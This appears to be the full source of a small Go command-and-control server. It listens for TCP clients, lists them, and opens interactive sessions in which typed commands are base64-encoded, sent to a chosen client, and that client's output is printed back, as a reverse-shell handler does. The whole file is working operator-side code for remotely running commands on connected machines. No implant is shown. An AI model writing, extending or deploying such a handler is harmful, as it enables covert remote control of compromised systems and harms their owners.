package main

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"net"
	"os"
	"strings"
)

var clients = make(map[string]net.Conn)

func main() {
	ln, _ := net.Listen("tcp", "127.0.0.1:3030")
	defer ln.Close()
	fmt.Println("Server is running, waiting for clients...")

	// go routine to handle new client connections
	go func() {
		for {
			conn, _ := ln.Accept()
			fmt.Println("\nNew client connected:", conn.RemoteAddr())
			clients[conn.RemoteAddr().String()] = conn
		}
	}()

	for {
		reader := bufio.NewReader(os.Stdin)
		fmt.Print("Enter command: ")
		cmd, _ := reader.ReadString('\n')
		cmd = cmd[:len(cmd)-1]

		// check command
		if cmd == "/list" {
			if len(clients) == 0 {
				fmt.Println("No clients connected.")
			} else {
				for k := range clients {
					fmt.Println(k)
				}
			}
		} else if strings.HasPrefix(cmd, "/session:") {
			ip := strings.TrimPrefix(cmd, "/session:")
			sessionClient, ok := clients[ip]
			if !ok {
				fmt.Println("Client not found.")
				continue
			}
			fmt.Println("Interacting with client:", ip)
			// loop for user-client interaction
			for {
				fmt.Print("$: ")
				clientCmd, _ := reader.ReadString('\n')
				clientCmd = clientCmd[:len(clientCmd)-1]
				if clientCmd == "/menu" {
					fmt.Println("Exiting session with client:", ip)
					break
				}
				encodedCmd := base64.StdEncoding.EncodeToString([]byte(clientCmd))
				sessionClient.Write([]byte(encodedCmd + "\n"))

				encodedOutput, _ := bufio.NewReader(sessionClient).ReadString('\n')
				decodedOutput, _ := base64.StdEncoding.DecodeString(encodedOutput[:len(encodedOutput)-1])

				fmt.Println(string(decodedOutput))
			}
		} else if cmd == "/help" {
			fmt.Println("Available commands:")
			fmt.Println("/list - list available clients")
			fmt.Println("/session:<client_ip> - interact with specific client")
			fmt.Println("/help - display available commands")
		} else {
			fmt.Println("Invalid command. Type /help for a list of available commands.")
		}
	}
}
